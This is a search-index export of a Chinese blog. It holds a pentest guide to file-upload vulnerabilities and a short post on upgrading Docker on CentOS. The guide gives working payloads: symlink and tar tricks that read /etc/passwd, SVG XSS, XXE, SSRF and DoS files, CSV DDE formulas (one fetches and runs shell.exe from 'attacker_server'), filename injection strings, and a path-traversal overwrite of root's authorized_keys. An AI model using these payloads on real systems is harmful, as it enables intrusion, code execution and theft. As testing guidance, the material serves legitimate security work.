创建了/etc/passwd 文件的符号链接，并使用以下命令将文件压缩到 ZIP 存档中 sudo ln -s ../../../../../../../../../../etc/passwd name_of_symlink.txt sudo zip --symlink zip_file.zip name_of_symlink.txt 上传了包含Symlink的ZIP文件，提取了 Symlink 文件，通过预览文件访问服务器的“passwd”文件的内容 ","date":"2024-10-21","objectID":"/posts/file-upload-attack-surface-and-cases/:3:2","tags":["Pentest","FileUpload"],"title":"文件上传攻击面\u0026案例","uri":"/posts/file-upload-attack-surface-and-cases/"},{"categories":["Pentest"],"content":"利用tar权限 Abusing tar permissions 如果应用程序服务端使用 tar命令提取解压.tar文件、删除符号链接并访问子目录，则可以尝试利用 tar 权限控制绕过符号链接删除过程。 tar命令创建.tar文件存档时会保留分配给它的 unix 权限。如果设置父目录无人可读（ chmod 300），同时子目录具有完整权限（ chmod 700），则可以在子目录中包含符号链接，这些符号链接在符号链接删除过程中不会被找到，但由于子目录具有读取权限，因此直接访问时会找到。 案例：Reading local files by abusing tar permissions in Gitlab Imports (Possibly leading to RCE) $ mkdir parent $ cd parent $ tar cf a.tar . --mode=300 $ mkdir sub $ cd sub $ ln -s /etc/passwd file.txt $ cd .. $ tar -rf a.tar sub ","date":"2024-10-21","objectID":"/posts/file-upload-attack-surface-and-cases/:3:3","tags":["Pentest","FileUpload"],"title":"文件上传攻击面\u0026案例","uri":"/posts/file-upload-attack-surface-and-cases/"},{"categories":["Pentest"],"content":"1.4. 允许上传HTML文件 允许上传html或者XML都可以能导致xss，也能导致任意URL跳转，甚至还能导致SSRF（很难利用），因为核心还是js代码可控。 html造成XSS就不多说了，懂得都懂 HTML文件后缀 Common htm html shtml IIS htm hxt Apache httpd html.de html.xxx 其他/少见 body manifest appcache 检查 MIME 类型是否存在可能的 XSS： content-type-research 项目 ","date":"2024-10-21","objectID":"/posts/file-upload-attack-surface-and-cases/:4:0","tags":["Pentest","FileUpload"],"title":"文件上传攻击面\u0026案例","uri":"/posts/file-upload-attack-surface-and-cases/"},{"categories":["Pentest"],"content":"1.5. 允许上传XML格式文件并解析 如果允许上传XML格式文件，如docx、xlsx、svg等本质是xml的文件，且后端会对上传的文件进行解析，那么可能存在XSS、XXE等漏洞 ","date":"2024-10-21","objectID":"/posts/file-upload-attack-surface-and-cases/:5:0","tags":["Pentest","FileUpload"],"title":"文件上传攻击面\u0026案例","uri":"/posts/file-upload-attack-surface-and-cases/"},{"categories":["Pentest"],"content":"XSS XSS 后缀 Common xml svg xht xsd xsl svgz xhtml IIS dtd vml xsf mno wsdl xslt disco exe.config dll.config Apache httpd rdf mathml 其他/少见 vtt mml 主要说说svg文件如何造成xss 检查思路： 创建一个恶意的svg文件，输入如下内容： \u003c?xml version=\"1.0\" standalone=\"no\"?\u003e \u003c!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\"\u003e \u003csvg version=\"1.1\" baseProfile=\"full\" xmlns=\"http://www.w3.org/2000/svg\"\u003e \u003cpolygon id=\"triangle\" points=\"0,0 0,50 50,0\" fill=\"#009900\" stroke=\"#004400\"/\u003e \u003cscript type=\"text/javascript\"\u003e alert(document.domain); \u003c/script\u003e \u003c/svg\u003e 上传到文件中，并访问即可触发XSS。 ","date":"2024-10-21","objectID":"/posts/file-upload-attack-surface-and-cases/:5:1","tags":["Pentest","FileUpload"],"title":"文件上传攻击面\u0026案例","uri":"/posts/file-upload-attack-surface-and-cases/"},{"categories":["Pentest"],"content":"XXE XXE in XML 以恶意svg为例，一般尝试OOB外带注入的方式来判断最快 \u003c?xml version=\"1.0\" standalone=\"yes\"?\u003e \u003c!DOCTYPE test [ \u003c!ENTITY xxe SYSTEM \"file:///etc/hostname\" \u003e ]\u003e \u003csvg width=\"128px\" height=\"128px\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" version=\"1.1\"\u003e \u003ctext font-size=\"16\" x=\"0\" y=\"16\"\u003e\u0026xxe;\u003c/text\u003e \u003c/svg\u003e 恶意的XXE文档生成：docem XXE in OOXML/ODF .docx .xlsx .odt https://oxmlxxe.github.io/ Exploiting XXE with Excel ","date":"2024-10-21","objectID":"/posts/file-upload-attack-surface-and-cases/:5:2","tags":["Pentest","FileUpload"],"title":"文件上传攻击面\u0026案例","uri":"/posts/file-upload-attack-surface-and-cases/"},{"categories":["Pentest"],"content":"SSRF Tip: 如果目标存在导出功能，如给svg导出为pdf这种功能，那么可能存在SSRF \u003csvg xmlns:svg=\"http://www.w3.org/2000/svg\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" width=\"200\" height=\"200\"\u003e \u003cimage height=\"30\" width=\"30\" xlink:href=\"https://controlledserver.com/pic.svg\" /\u003e \u003c/svg\u003e 可尝试使用其他协议更直观的查看，如file:// 参考： SVG Server Side Request Forgery (SSRF) SVG SSRF Cheatsheet ","date":"2024-10-21","objectID":"/posts/file-upload-attack-surface-and-cases/:5:3","tags":["Pentest","FileUpload"],"title":"文件上传攻击面\u0026案例","uri":"/posts/file-upload-attack-surface-and-cases/"},{"categories":["Pentest"],"content":"DOS 如果可以上传任意SVG文件，且可在网站的某些页面中进行展示，那么可以通过反复嵌套使用，直至浏览器或者电脑卡死。 可以展示：不一定非得是\u003csvg\u003e标签的形式，也可以通过img等标签展示，形如：\u003cimg src=\"data:image/svg+xml;base64,\u003csvg base64\u003e\" alt=\"SVG Image\"\u003e \u003csvg version=\"1.2\" baseProfile=\"tiny\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" x=\"0px\" y=\"0px\" xml:space=\"preserve\"\u003e \u003cpath id=\"a\" d=\"M0,0\"/\u003e \u003cg id=\"b\"\u003e\u003cuse xlink:href=\"#a\"/\u003e\u003cuse xlink:href=\"#a\"/\u003e\u003cuse xlink:href=\"#a\"/\u003e\u003cuse xlink:href=\"#a\"/\u003e\u003cuse xlink:href=\"#a\"/\u003e\u003cuse xlink:href=\"#a\"/\u003e\u003cuse xlink:href=\"#a\"/\u003e\u003cuse xlink:href=\"#a\"/\u003e\u003cuse xlink:href=\"#a\"/\u003e\u003cuse xlink:href=\"#a\"/\u003e\u003c/g\u003e \u003cg id=\"c\"\u003e\u003cuse xlink:href=\"#b\"/\u003e\u003cuse xlink:href=\"#b\"/\u003e\u003cuse xlink:href=\"#b\"/\u003e\u003cuse xlink:href=\"#b\"/\u003e\u003cuse xlink:href=\"#b\"/\u003e\u003cuse xlink:href=\"#b\"/\u003e\u003cuse xlink:href=\"#b\"/\u003e\u003cuse xlink:href=\"#b\"/\u003e\u003cuse xlink:href=\"#b\"/\u003e\u003cuse xlink:href=\"#b\"/\u003e\u003c/g\u003e \u003cg id=\"d\"\u003e\u003cuse xlink:href=\"#c\"/\u003e\u003cuse xlink:href=\"#c\"/\u003e\u003cuse xlink:href=\"#c\"/\u003e\u003cuse xlink:href=\"#c\"/\u003e\u003cuse xlink:href=\"#c\"/\u003e\u003cuse xlink:href=\"#c\"/\u003e\u003cuse xlink:href=\"#c\"/\u003e\u003cuse xlink:href=\"#c\"/\u003e\u003cuse xlink:href=\"#c\"/\u003e\u003cuse xlink:href=\"#c\"/\u003e\u003c/g\u003e \u003cg id=\"e\"\u003e\u003cuse xlink:href=\"#d\"/\u003e\u003cuse xlink:href=\"#d\"/\u003e\u003cuse xlink:href=\"#d\"/\u003e\u003cuse xlink:href=\"#d\"/\u003e\u003cuse xlink:href=\"#d\"/\u003e\u003cuse xlink:href=\"#d\"/\u003e\u003cuse xlink:href=\"#d\"/\u003e\u003cuse xlink:href=\"#d\"/\u003e\u003cuse xlink:href=\"#d\"/\u003e\u003cuse xlink:href=\"#d\"/\u003e\u003c/g\u003e \u003cg id=\"f\"\u003e\u003cuse xlink:href=\"#e\"/\u003e\u003cuse xlink:href=\"#e\"/\u003e\u003cuse xlink:href=\"#e\"/\u003e\u003cuse xlink:href=\"#e\"/\u003e\u003cuse xlink:href=\"#e\"/\u003e\u003cuse xlink:href=\"#e\"/\u003e\u003cuse xlink:href=\"#e\"/\u003e\u003cuse xlink:href=\"#e\"/\u003e\u003cuse xlink:href=\"#e\"/\u003e\u003cuse xlink:href=\"#e\"/\u003e\u003c/g\u003e \u003cg id=\"g\"\u003e\u003cuse xlink:href=\"#f\"/\u003e\u003cuse xlink:href=\"#f\"/\u003e\u003cuse xlink:href=\"#f\"/\u003e\u003cuse xlink:href=\"#f\"/\u003e\u003cuse xlink:href=\"#f\"/\u003e\u003cuse xlink:href=\"#f\"/\u003e\u003cuse xlink:href=\"#f\"/\u003e\u003cuse xlink:href=\"#f\"/\u003e\u003cuse xlink:href=\"#f\"/\u003e\u003cuse xlink:href=\"#f\"/\u003e\u003c/g\u003e \u003cg id=\"h\"\u003e\u003cuse xlink:href=\"#g\"/\u003e\u003cuse xlink:href=\"#g\"/\u003e\u003cuse xlink:href=\"#g\"/\u003e\u003cuse xlink:href=\"#g\"/\u003e\u003cuse xlink:href=\"#g\"/\u003e\u003cuse xlink:href=\"#g\"/\u003e\u003cuse xlink:href=\"#g\"/\u003e\u003cuse xlink:href=\"#g\"/\u003e\u003cuse xlink:href=\"#g\"/\u003e\u003cuse xlink:href=\"#g\"/\u003e\u003c/g\u003e \u003cg id=\"i\"\u003e\u003cuse xlink:href=\"#h\"/\u003e\u003cuse xlink:href=\"#h\"/\u003e\u003cuse xlink:href=\"#h\"/\u003e\u003cuse xlink:href=\"#h\"/\u003e\u003cuse xlink:href=\"#h\"/\u003e\u003cuse xlink:href=\"#h\"/\u003e\u003cuse xlink:href=\"#h\"/\u003e\u003cuse xlink:href=\"#h\"/\u003e\u003cuse xlink:href=\"#h\"/\u003e\u003cuse xlink:href=\"#h\"/\u003e\u003c/g\u003e \u003cg id=\"j\"\u003e\u003cuse xlink:href=\"#i\"/\u003e\u003cuse xlink:href=\"#i\"/\u003e\u003cuse xlink:href=\"#i\"/\u003e\u003cuse xlink:href=\"#i\"/\u003e\u003cuse xlink:href=\"#i\"/\u003e\u003cuse xlink:href=\"#i\"/\u003e\u003cuse xlink:href=\"#i\"/\u003e\u003cuse xlink:href=\"#i\"/\u003e\u003cuse xlink:href=\"#i\"/\u003e\u003cuse xlink:href=\"#i\"/\u003e\u003c/g\u003e \u003c/svg\u003e 原理： xlink:href 属性以 IRI（国际资源标识）方式定义了对某个资源的引用，该链接的具体含义需根据使用该链接的每个元素的上下文来决定。 \u003cuse\u003e 元素从 SVG 文档中获取节点，然后将其复制到其他位置。 上述代码通过递归嵌套，导致浏览器拒绝服务，网站页面崩溃。 ","date":"2024-10-21","objectID":"/posts/file-upload-attack-surface-and-cases/:5:4","tags":["Pentest","FileUpload"],"title":"文件上传攻击面\u0026案例","uri":"/posts/file-upload-attack-surface-and-cases/"},{"categories":["Pentest"],"content":"1.6. 允许上传CSV 如果允许上传CSV文件，且上传的CSV文件的内容未经过处理过滤直接保存，那么可以尝试上传具有恶意命令执行payload的CSV文件，当其他用户下载该CSV文件时，可能会导致命令执行。 CSV Payload DDE (\"cmd\";\"/C calc\";\"!A0\")A0 @SUM(1+9)*cmd|' /C calc'!A0 =10+20+cmd|' /C calc'!A0 =cmd|' /C notepad'!'A1' =cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0 =cmd|'/c rundll32.exe \\\\10.0.0.1\\3\\2\\1.dll,0'!_xlbgnm.A1 检查思路： 上传恶意的CSV文件 下载恶意的CSV文件 观察下载后的CSV文件是否对等号=等特殊符号做了处理，payloads会否会成功执行，如果能则说明存在问题 参考： CSV Injection at xxxxx Authenticated Code Execution through Phar deserialization in CSV Importer as Shop manager in WooCommerce ","date":"2024-10-21","objectID":"/posts/file-upload-attack-surface-and-cases/:6:0","tags":["Pentest","FileUpload"],"title":"文件上传攻击面\u0026案例","uri":"/posts/file-upload-attack-surface-and-cases/"},{"categories":["Pentest"],"content":"1.7. 允许上传PDF 可能存在PDF XSS和任意URL跳转。 可以直接使用工具生成：https://github.com/harunoz/js_pdf_xss.git 也可以按照网上的操作，用迅捷PDF编辑器去操作，效果都一样 pdfjs 漏洞： CVE-2024-4367 获取Cookie、账户接管等。https://github.com/LOURC0D3/CVE-2024-4367-PoC 参考： Stored XSS through PDF viewer XSS in PDF Viewer ","date":"2024-10-21","objectID":"/posts/file-upload-attack-surface-and-cases/:7:0","tags":["Pentest","FileUpload"],"title":"文件上传攻击面\u0026案例","uri":"/posts/file-upload-attack-surface-and-cases/"},{"categories":["Pentest"],"content":"1.8. 允许上传音视频文件 上传Audio/Video的利用点 Text Metadata 元数据：XSS, SQLi, 命令注入 ffmpeg： SSRF/File Read in HLS playlists (m3u8)：https://github.com/ffmpeg-test/ffmpeg-test SSRF/File Read in HLS inside AVI：https://github.com/neex/ffmpeg-avi-m3u-xbin Images in mp3 metadata 参考： External SSRF and Local File Read via video upload due to vulnerable FFmpeg HLS processing SSRF and local file read in video to gif converter ","date":"2024-10-21","objectID":"/posts/file-upload-attack-surface-and-cases/:8:0","tags":["Pentest","FileUpload"],"title":"文件上传攻击面\u0026案例","uri":"/posts/file-upload-attack-surface-and-cases/"},{"categories":["Pentest"],"content":"1.9. 允许上传图片 https://github.com/barrracud4/image-upload-exploits ","date":"2024-10-21","objectID":"/posts/file-upload-attack-surface-and-cases/:9:0","tags":["Pentest","FileUpload"],"title":"文件上传攻击面\u0026案例","uri":"/posts/file-upload-attack-surface-and-cases/"},{"categories":["Pentest"],"content":"大文件DOS 文件上传的时候，服务端通常会对上传的文件进行大小限制，范围一般为5MB-200 MB，甚至更小/更大，具体取决于应用程序逻辑。但是如果未限制文件大小或不存在相关的验证检查，那么攻击者可能会上传相对较大的文件，造成大量资源消耗，从而可能导致拒绝服务。 检查思路： 创建一个超大的图片文件，如500M的png，并上传图片 新开一个浏览器页面或从另一台设备浏览网站，查看响应速度是否变慢或是否存在连接错误等异常情况 参考： PNG compression DoS ","date":"2024-10-21","objectID":"/posts/file-upload-attack-surface-and-cases/:9:1","tags":["Pentest","FileUpload"],"title":"文件上传攻击面\u0026案例","uri":"/posts/file-upload-attack-surface-and-cases/"},{"categories":["Pentest"],"content":"像素洪水攻击 任意可以上传图片的地方都可以进行测试；在Pixel Flood Attack中，攻击者尝试上传具有大像素的文件（64250x64250像素），一些应用会使用第三方组件/库对图像进行缩小处理，以节省存储空间和处理能力，但是这些第三方库在处理的时候，会将“整个图像”加载到内存中，它会尝试将4128062500像素分配到内存中，从而消耗服务器资源，导致应用最终崩溃宕机。 检查思路： 在https://www.resizepixel.com/中调整图片大小为 64250x64250，上传图片（现在好像不行了） 新开一个浏览器页面或从另一台设备浏览网站，查看响应速度是否变慢或是否存在连接错误等异常情况 参考 Pixel flood attack Pixel Flood Attack leads to Application level DoS ","date":"2024-10-21","objectID":"/posts/file-upload-attack-surface-and-cases/:9:2","tags":["Pentest","FileUpload"],"title":"文件上传攻击面\u0026案例","uri":"/posts/file-upload-attack-surface-and-cases/"},{"categories":["Pentest"],"content":"元数据攻击 使用 exiftool这个工具可以通过改变EXIF metadata进而一定几率引起某处反射： #!bash $ exiftool -field = XSS FILE 例如： #!bash $ exiftool -Artist=’ “\u003e\u003cimg src=1 onerror=alert(document.domain)\u003e’ brute.jpeg 参考： RCE when removing metadata with ExifTool XXE through injection of a payload in the XMP metadata of a JPEG file XSS in image metadata field ","date":"2024-10-21","objectID":"/posts/file-upload-attack-surface-and-cases/:9:3","tags":["Pentest","FileUpload"],"title":"文件上传攻击面\u0026案例","uri":"/posts/file-upload-attack-surface-and-cases/"},{"categories":["Pentest"],"content":"图片二次渲染 若服务端使用存在漏洞的组件对上传图片进行二次渲染等操作，那么也可以尝试RCE，如ImageMagick 一些ImageMagick相关的CVE： CVE-2016–3714 — 字符过滤不足导致潜在RCE CVE-2016–3715 — File deletion CVE-2016–3716 — File moving CVE-2016–3717 — Local file read CVE-2016–3718 — SSRF 参考： HEIC image preview can be used to invoke Imagick ","date":"2024-10-21","objectID":"/posts/file-upload-attack-surface-and-cases/:9:4","tags":["Pentest","FileUpload"],"title":"文件上传攻击面\u0026案例","uri":"/posts/file-upload-attack-surface-and-cases/"},{"categories":["Pentest"],"content":"内存泄露 ImageMagick相关的CVE XBM：CVE-2018-16323 GIF：CVE-2017-15277 参考： Missing “size check” on files to upload could make memory leaks. AWS keys and user cookie leakage via uninitialized memory leak in outdated librsvg version in Basecamp ","date":"2024-10-21","objectID":"/posts/file-upload-attack-surface-and-cases/:9:5","tags":["Pentest","FileUpload"],"title":"文件上传攻击面\u0026案例","uri":"/posts/file-upload-attack-surface-and-cases/"},{"categories":["Pentest"],"content":"GhostScript PS/PDF CVE-2019-1481X CVE-2019-10216 CVE-2019-6116 CVE-2018-16509 CVE-2017-8291 参考： Remote Code Execution on xxxx/my_reports on Logo upload ","date":"2024-10-21","objectID":"/posts/file-upload-attack-surface-and-cases/:9:6","tags":["Pentest","FileUpload"],"title":"文件上传攻击面\u0026案例","uri":"/posts/file-upload-attack-surface-and-cases/"},{"categories":["Pentest"],"content":"合法文件隐藏载荷 在图片元数据中隐藏 Shell/XSS 载荷 在图片二进制数据中隐藏 Shell/XSS 载荷 这个比较简单，和上面内容有重复，就不说了。 ","date":"2024-10-21","objectID":"/posts/file-upload-attack-surface-and-cases/:9:7","tags":["Pentest","FileUpload"],"title":"文件上传攻击面\u0026案例","uri":"/posts/file-upload-attack-surface-and-cases/"},{"categories":["Pentest"],"content":"1.10 允许上传文件预览 常见的文件预览包括：PDF、图片、HTML等文件。 如果应用程序调整图片大小或处理媒体，请检查图像漏洞 (+favicon.ico) 这个比较简单，和上面内容有重复，就不说了。 ","date":"2024-10-21","objectID":"/posts/file-upload-attack-surface-and-cases/:10:0","tags":["Pentest","FileUpload"],"title":"文件上传攻击面\u0026案例","uri":"/posts/file-upload-attack-surface-and-cases/"},{"categories":["Pentest"],"content":"1.11 允许上传配置文件 # Apache httpd/ Tomcat .htaccess # ASP.NET / IIS web.config # 其他访问/框架 …… ","date":"2024-10-21","objectID":"/posts/file-upload-attack-surface-and-cases/:11:0","tags":["Pentest","FileUpload"],"title":"文件上传攻击面\u0026案例","uri":"/posts/file-upload-attack-surface-and-cases/"},{"categories":["Pentest"],"content":"1.12. 文件名攻击 不会对上传文件重命名或对文件操作过程中可能性的问题。 ","date":"2024-10-21","objectID":"/posts/file-upload-attack-surface-and-cases/:12:0","tags":["Pentest","FileUpload"],"title":"文件上传攻击面\u0026案例","uri":"/posts/file-upload-attack-surface-and-cases/"},{"categories":["Pentest"],"content":"路径遍历/UNC 相对路径： ../../../../tmp/upload.txt 绝对路径：/tmp/upload.txt UNC路径：\\\\evil.com\\share\\test.png 一些网站配置不当，或者开发安全意识不严谨，将用户上传的文件直接按原名存储到服务器中，那么我们就可以尝试将文件名添加回溯符../，以上传文件到任意目录，甚至覆盖文件，达到getshell或者破坏系统的目的。 🔔 Tip 在windows中由于部分符号不能作为文件名，如果我们将文件名设置为带有这些特殊符号的内容，那么可能让服务器抛出异常 较少的情况下，可以控制上传的目录名，也可以通过路径遍历的方法上传到任意目录中。 如将文件名设置为../../../../etc/passwd，然后上传对应的内容，那么则有可能直接覆盖掉/etc/passwd 一般情况下尽量去覆盖不会对系统产生影响且我们可以直接观察到的文件，如robots.txt等 上传覆盖文件 有点类似Redis写ssh 写SSH公钥 覆盖 /root/.ssh/authorized_keys 文件。如果这个文件包含我们控制的私钥的公钥，我们就可以以root 用户通过SSH访问系统。 使用 ssh-keygen 创建一个 SSH 密钥对，以及一个名为 authorized_keys的文件，其中包含之前创建的公钥。 kali@kali:~$ ssh-keygen Generating public/private rsa key pair. Enter file in which to save the key (/home/kali/.ssh/id_rsa): fileup Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in fileup Your public key has been saved in fileup.pub ... kali@kali:~$ cat fileup.pub \u003e authorized_keys 为文件上传准备authorized_keys 文件 使用相对路径 ../../../../../../../root/.ssh/authorized_keys 上传它进行覆盖。 ","date":"2024-10-21","objectID":"/posts/file-upload-attack-surface-and-cases/:12:1","tags":["Pentest","FileUpload"],"title":"文件上传攻击面\u0026案例","uri":"/posts/file-upload-attack-surface-and-cases/"},{"categories":["Pentest"],"content":"SSRF 尝试将 URL 作为文件名发送以获取盲 SSRF，例如filename=https://172.17.0.1/internal/file。 还可以尝试在请求中更改type=\"file\"为。type=\"url\" ","date":"2024-10-21","objectID":"/posts/file-upload-attack-surface-and-cases/:12:2","tags":["Pentest","FileUpload"],"title":"文件上传攻击面\u0026案例","uri":"/posts/file-upload-attack-surface-and-cases/"},{"categories":["Pentest"],"content":"DOS 后端没有对文件名长度进行限制，可以尝试上传一个名称较大的文件，有时会导致 DoS。 案例：报告：头像名称参数值过大导致平台上其他用户和程序遭受 DoS 攻击 ","date":"2024-10-21","objectID":"/posts/file-upload-attack-surface-and-cases/:12:3","tags":["Pentest","FileUpload"],"title":"文件上传攻击面\u0026案例","uri":"/posts/file-upload-attack-surface-and-cases/"},{"categories":["Pentest"],"content":"文件名注入 在文件名中加入 XSS、SQLi、命令注入payload。 在文件名中加入攻击载荷，服务端可能对上传的文件名进行各种处理，如展示到页面、存储到数据库等，因此可能存在各种各样的注入，如XSS、SQLI、命令注入等 如上传文件名为test.png，那么我们可以设置变量为§test§.png，然后fuzz一下各种注入的payload，如： a$(whoami)z.png a`whoami`z.png a';select+sleep(10);--z.png sleep(10)-- -.png \u003ch1\u003etest\u003ch1\u003e.png ${2*3} 命令注入的情况： 文件上传后，服务端通过系统命令进行文件的重命名、复制、移动、删除等动作，可能调用系统命令执行。未对文件名进行过滤，导致命令注入。 参考： RCE vulnerability in a file name Remote Unrestricted file Creation/Deletion and Possible RCE. ","date":"2024-10-21","objectID":"/posts/file-upload-attack-surface-and-cases/:12:4","tags":["Pentest","FileUpload"],"title":"文件上传攻击面\u0026案例","uri":"/posts/file-upload-attack-surface-and-cases/"},{"categories":["Pentest"],"content":"1.13. 文件路径可控 路径遍历 POST /uai/download/uploadfileToPath.htm HTTP/1.1 ………… -----------------------------570xxxxxxxxx6025274xxxxxxxx1 Content-Disposition: form-data; name=\"input_localfile\"; filename=\"xxx.jsp\" Content-Type: image/png \u003c%out.println('test123');%\u003e -----------------------------570xxxxxxxxx6025274xxxxxxxx1 Content-Disposition: form-data; name=\"uploadpath\" ../webapps/notifymsg/devreport/ -----------------------------570xxxxxxxxx6025274xxxxxxxx1-- 参考： Unrestricted file upload (RCE) ","date":"2024-10-21","objectID":"/posts/file-upload-attack-surface-and-cases/:13:0","tags":["Pentest","FileUpload"],"title":"文件上传攻击面\u0026案例","uri":"/posts/file-upload-attack-surface-and-cases/"},{"categories":["Pentest"],"content":"1.14. 元数据泄漏 元数据是照片背后的故事，它告诉我们图像文件是如何创建的，在哪里和何时创建的。它还描述了照片的内容，确定了摄影师，并向您展示了图像在后期处理中是如何编辑的。简单地说，假设您使用数码相机单击了一张图片，当该图像被处理并保存在存储设备上时，一些属性被添加到文件中，例如作者、位置、设备信息和其他适用于描述图像信息的信息。 如果服务端对用户上传的图片未进行处理就直接展示，那么将可能会导致源数据泄漏；通常情况下，元数据中包含GPS地址、设备信息等，会被当作低危。 Note 元数据泄漏不仅限于图片，还可以在其他文件格式中找到，如PDF 检查方法： 在头像上传等图片可以被枚举的功能点上传包含有exif敏感信息的图片，没有的话可以用手机现拍 下载刚才上传的图片（如果用下面的在线平台这一步可以省略） 使用 http://exif.regex.info/exif.cgi 或者 exiftool 去分析数据 参考： EXIF metadata not stripped from JPG group logos，隐私泄露问题 ","date":"2024-10-21","objectID":"/posts/file-upload-attack-surface-and-cases/:14:0","tags":["Pentest","FileUpload"],"title":"文件上传攻击面\u0026案例","uri":"/posts/file-upload-attack-surface-and-cases/"},{"categories":["Pentest"],"content":"参考文章 https://blog.gm7.org/个人知识库/01.渗透测试/02.WEB漏洞/16.文件上传 https://github.com/c0ny1/upload-labs https://0xn3va.gitbook.io/cheat-sheets/web-application/file-upload-vulnerabilities ","date":"2024-10-21","objectID":"/posts/file-upload-attack-surface-and-cases/:15:0","tags":["Pentest","FileUpload"],"title":"文件上传攻击面\u0026案例","uri":"/posts/file-upload-attack-surface-and-cases/"},{"categories":["问题解决","Cloud"],"content":"前言 因为需要安装minikube，其中有Docker版本要求，当前版本太低了，需要升级。 [root@localhost xavier]# minikube start --driver=docker 😄 minikube v1.32.0 on Centos 7.9.2009 ✨ Using the docker driver based on user configuration 💣 Exiting due to PROVIDER_DOCKER_VERSION_EXIT_1: \"docker version --format \u003cno value\u003e-\u003cno value\u003e:\u003cno value\u003e\" exit status 1: template: :1:44: executing \"\" at \u003c.Server.Platform.Nam...\u003e: can't evaluate field Platform in type *types.Version 📘 Documentation: https://minikube.sigs.k8s.io/docs/drivers/docker/ 确认当前版本： docker -v docker --version docker version [root@localhost xavier]# docker --version Docker version 1.13.1, build 7d71120/1.13.1 检查当前安装的软件包 rpm -qa | grep docker yum list installed | grep docker [root@localhost xavier]# yum list installed | grep docker docker.x86_64 2:1.13.1-210.git7d71120.el7.centos @extras docker-client.x86_64 2:1.13.1-210.git7d71120.el7.centos @extras docker-common.x86_64 2:1.13.1-210.git7d71120.el7.centos @extras ","date":"2024-04-16","objectID":"/posts/docker%E4%BD%8E%E7%89%88%E6%9C%AC%E5%8D%87%E7%BA%A7/:1:0","tags":["问题解决","Docker","Cloud"],"title":"Docker低版本升级","uri":"/posts/docker%E4%BD%8E%E7%89%88%E6%9C%AC%E5%8D%87%E7%BA%A7/"},{"categories":["问题解决","Cloud"],"content":"yum安装 配置yum镜像源，更新yum， # 安装yum管理工具 yum install -y yum-utils # 添加国内镜像源 yum-config-manager --add-repo https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo sudo yum update -y 检索想要安装的版本 yum list docker-ce --showduplicates|sort -r [root@localhost xavier]# yum list docker-ce --showduplicates|sort -r ... docker-ce.x86_64 3:18.09.6-3.el7 docker-ce-stable docker-ce.x86_64 3:18.09.5-3.el7 docker-ce-stable docker-ce.x86_64 18.03.1.ce-1.el7.centos docker-ce-stable docker-ce.x86_64 18.03.0.ce-1.el7.centos docker-ce-stable docker-ce.x86_64 17.12.1.ce-1.el7.centos docker-ce-stable docker-ce.x86_64 17.03.3.ce-1.el7 docker-ce-stable ... 安装指定版本的docker yum -y install docker-ce-18.03.1.ce-1.el7.centos [root@localhost ~]# systemctl start docker [root@localhost ~]# docker --version yum安装有可能无法安装最新版本，因为yum库相对官网会滞后一些。 ","date":"2024-04-16","objectID":"/posts/docker%E4%BD%8E%E7%89%88%E6%9C%AC%E5%8D%87%E7%BA%A7/:2:0","tags":["问题解决","Docker","Cloud"],"title":"Docker低版本升级","uri":"/posts/docker%E4%BD%8E%E7%89%88%E6%9C%AC%E5%8D%87%E7%BA%A7/"},{"categories":["问题解决","Cloud"],"content":"安装最新版本 这种情况下，需要对原有docker进行卸载 sudo yum remove docker.xxxx [root@localhost xavier]# yum remove docker.x86_64 docker-client.x86_64 docker-common.x86_64 curl 从官网获取最新版本 curl -fsSL https://get.docker.com/ | sh [root@localhost xavier]# curl -fsSL https://get.docker.com/ | sh # Executing docker install script, commit: e5543d473431b782227f8908005543bb4389b8de + sh -c 'yum install -y -q yum-utils' Package yum-utils-1.1.31-54.el7_8.noarch already installed and latest version + sh -c 'yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo' Loaded plugins: fastestmirror, product-id, subscription-manager This system is not registered with an entitlement server. You can use subscription-manager to register. adding repo from: https://download.docker.com/linux/centos/docker-ce.repo grabbing file https://download.docker.com/linux/centos/docker-ce.repo to /etc/yum.repos.d/docker-ce.repo repo saved to /etc/yum.repos.d/docker-ce.repo + '[' stable '!=' stable ']' + sh -c 'yum makecache' Loaded plugins: fastestmirror, product-id, search-disabled-repos, subscription-manager This system is not registered with an entitlement server. You can use subscription-manager to register. Loading mirror speeds from cached hostfile * base: mirrors.bupt.edu.cn * extras: mirrors.bupt.edu.cn * updates: mirrors.bupt.edu.cn base | 3.6 kB 00:00:00 docker-ce-stable | 3.5 kB 00:00:00 extras | 2.9 kB 00:00:00 updates | 2.9 kB 00:00:00 Metadata Cache Created + sh -c 'yum install -y -q docker-ce docker-ce-cli containerd.io docker-compose-plugin docker-ce-rootless-extras docker-buildx-plugin' warning: /var/cache/yum/x86_64/7/docker-ce-stable/packages/docker-buildx-plugin-0.13.1-1.el7.x86_64.rpm: Header V4 RSA/SHA512 Signature, key ID 621e9f35: NOKEY Public key for docker-buildx-plugin-0.13.1-1.el7.x86_64.rpm is not installed Importing GPG key 0x621E9F35: Userid : \"Docker Release (CE rpm) \u003cdocker@docker.com\u003e\" Fingerprint: 060a 61c5 1b55 8a7f 742b 77aa c52f eb6b 621e 9f35 From : https://download.docker.com/linux/centos/gpg ================================================================================ To run Docker as a non-privileged user, consider setting up the Docker daemon in rootless mode for your user: dockerd-rootless-setuptool.sh install Visit https://docs.docker.com/go/rootless/ to learn about rootless mode. To run the Docker daemon as a fully privileged service, but granting non-root users access, refer to https://docs.docker.com/go/daemon-access/ WARNING: Access to the remote API on a privileged Docker daemon is equivalent to root access on the host. Refer to the 'Docker daemon attack surface' documentation for details: https://docs.docker.com/go/attack-surface/ ================================================================================ 重启doker service docker restart docker -v [root@localhost xavier]# service docker restart Redirecting to /bin/systemctl restart docker.service [root@localhost xavier]# docker -v Docker version 26.0.1, build d260a54 